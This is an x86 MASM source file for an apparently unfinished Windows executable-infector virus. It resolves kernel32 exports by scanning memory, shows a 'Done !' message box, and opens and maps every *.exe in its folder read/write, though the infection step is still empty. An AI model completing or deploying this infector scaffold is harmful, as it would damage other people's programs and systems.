; msgbox.asm

.386
.model flat, stdcall
option casemap:none

      include windows.inc
      include user32.inc
	  include kernel32.inc

	  include handle_file.inc


      includelib user32.lib
      includelib kernel32.lib

.data


.code

main:

	mov ebx, [esp]
	jmp startinf

movloc	macro	dest, src

	push edi
	mov edi, src
	mov dest, edi
	pop edi

		endm

addloc macro	dest, src

	push edi
	mov edi, dest
	add edi, src
	mov dest, edi
	pop edi

	   endm

extractKernel32PEHeader proc delta:dword

	and delta, 0FFFF0000h
l1:
	sub delta, 1000h
	mov ecx, [delta]
	cmp word ptr [ecx], "ZM"
	jne l1

	mov eax, [ecx + 3Ch]
	cmp word ptr [eax + ecx], "EP"
	je return
	xor eax, eax
	ret

return:
	add eax, ecx
	ret
extractKernel32PEHeader endp


getPEBaseAddr proc PEAddr:dword
	
	mov ebx, PEAddr
	add ebx, 18h ;; offset to IMAGE_OPTIONAL_HEADER
	assume ebx:ptr IMAGE_OPTIONAL_HEADER
	mov eax, [ebx].ImageBase
	assume ebx:nothing
	ret
getPEBaseAddr endp

getExportedProcAddr proc PEHeader:dword, PEBaseAddr:dword, ProcName:dword, ProcNameSize:dword
	local exportSectionVAddr:dword
	local numberOfFunctions:dword
	local exportDirectoryAddr:dword
	local funcIndex:dword
	local ordinalsAddr:dword
	local funcsAddr:dword

	mov ebx, PEHeader
	add ebx, 18h				;; Optional header
	add ebx, 60h				;; IMAGE_DATA_DIRECTORY[0]
	

	assume ebx:ptr IMAGE_DATA_DIRECTORY
	movloc exportSectionVAddr, [ebx].VirtualAddress
	assume ebx:nothing
	mov exportDirectoryAddr, ebx
	xor ebx, ebx

	mov eax, exportDirectoryAddr
	mov eax, [eax]				;; IMAGE_EXPORT_DIRECTORY relative virtual address
	add eax, PEBaseAddr			;; IMAGE_EXPORT_DIRECTORY true address

	mov funcIndex, 0
	assume eax:ptr IMAGE_EXPORT_DIRECTORY
	movloc numberOfFunctions, [eax].NumberOfNames
	movloc ordinalsAddr, [eax].AddressOfNameOrdinals	;; relative address
	movloc funcsAddr, [eax].AddressOfFunctions			;; relative address
	addloc funcsAddr, PEBaseAddr						;; true address
	mov ebx, [eax].AddressOfNames
	add ebx, PEBaseAddr				;; pointer to first name
	mov edx, numberOfFunctions
	addloc ordinalsAddr, PEBaseAddr						;; true address
	.WHILE funcIndex < edx
		.IF funcIndex == 0244h
			push 0
			add esp,4
		.ENDIF
		
		mov esi, [ebx]
		add esi, PEBaseAddr
		mov edi, ProcName
		mov ecx, ProcNameSize
		cld
		repe cmpsb
		je endfindproc

		inc funcIndex
		add ebx, sizeof dword		;; go to next pointer to name
	.ENDW
	jmp endfindprocfail

endfindproc:
COMMENT @
	sub ebx, [eax].AddressOfNames
	add ebx, [eax].AddressOfFunctions
	mov eax, [ebx]			;; function's virtual address
	add eax, PEBaseAddr
	@

	assume eax:nothing
	mov		edx,			funcIndex		;; edx iterations

	shl		edx,			1				;; ordinals are on 2 bytes, so in term of memory : iterations * 2
	add		edx,			ordinalsAddr	;; directly reach correct ordinal
	xor		eax,			eax
	mov		ax,	word ptr	[edx]			;; store func ordinal in ax
	shl		eax,			2				;; ordinal is an index for a 4 bytes value, so a direct memory offset is at : ordinal * 4
	add		eax,			funcsAddr		;; direct access to function's RVA
	mov		ebx,			[eax]			;; store function's RVA
	add		ebx,			PEBaseAddr		;; function's real address
	mov		eax,			ebx


endfindprocfail:
	ret
getExportedProcAddr endp


beginInfection proc delta:dword
	local K32PEHeaderAddr:dword
	local K32BaseAddr:dword
	local procLoadLibrary:dword
	local procGetProcAddress:dword
	local procMessageBox:dword
	local localDelta:dword
	local hmodule:dword

	jmp Kernel32Init

beginInfectionStr:
	LoadLibraryStr	db "LoadLibraryA",0		; localDelta + 0h
	GetProcAddrStr	db "GetProcAddress",0	; + 0Dh
	User32DllStr	db "User32.dll",0		; + 0Fh
	MessageBoxStr	db "MessageBoxA",0		; + 0Bh
	TitleStr		db "Done !",0			; + 0Ch

Kernel32Init:
	mov eax, [esp]
	mov localDelta, beginInfectionStr
	invoke extractKernel32PEHeader, delta
	mov K32PEHeaderAddr, eax
	invoke getPEBaseAddr, K32PEHeaderAddr
	mov K32BaseAddr, eax



	invoke getExportedProcAddr, K32PEHeaderAddr, K32BaseAddr, localDelta, sizeof LoadLibraryStr
	mov procLoadLibrary, eax
	
	add localDelta, 0Dh
	invoke getExportedProcAddr, K32PEHeaderAddr, K32BaseAddr, localDelta, sizeof GetProcAddrStr
	mov procGetProcAddress, eax

	add localDelta, 0Fh
	push localDelta
	call procLoadLibrary
	mov hmodule, eax

	add localDelta, 0Bh
	push localDelta
	push hmodule
	call procGetProcAddress
	mov procMessageBox, eax

	add localDelta, 0Ch
	push MB_OK
	push localDelta
	push localDelta
	push 0
	call procMessageBox

	ret
beginInfection endp

filesLoop proc
	local findFileData:WIN32_FIND_DATA
	local searchHandle:dword
	local fileHandle:dword
	local fileMapping:dword
	local fileView:dword
	
	jmp filesLoopInit

	PatternStr	db "*.exe",0 ; As a side note, Jambi is started in our /trunk/jambi/ so add an exe there if you want this to work

filesLoopInit:
	invoke FindFirstFile, offset PatternStr, addr findFileData
	cmp eax, INVALID_HANDLE_VALUE
	je filesFinished ; we are fucked
	mov searchHandle, eax
	
fileMainLoop:
	
	invoke CreateFile, addr findFileData.cFileName, GENERIC_READ or GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0
	cmp eax, INVALID_HANDLE_VALUE
	je fileNext
	mov fileHandle, eax

	invoke CreateFileMapping, fileHandle, 0, PAGE_READWRITE, 0, 0, 0 ; This is where we have to change the size of our program.
	cmp eax, 0
	je fileClose
	mov fileMapping, eax

	invoke MapViewOfFile, fileMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0
	cmp eax, 0
	je fileMapClose
	mov fileView, eax

	; fileView now points toward an array representing our file

	invoke UnmapViewOfFile, fileView

fileMapClose:
	invoke CloseHandle, fileMapping

fileClose:
	invoke CloseHandle, fileHandle
	
fileNext:
	invoke FindNextFile, searchHandle, addr findFileData
	cmp eax, 0
	jne fileMainLoop

fileNoMore:
	invoke FindClose, searchHandle

filesFinished:
	ret
filesLoop endp

startinf:

	xor eax, eax
	;invoke extractKernel32PEHeader, ebx
	invoke beginInfection, ebx

	invoke filesLoop

endmloop:

	ret
endfile:
end	main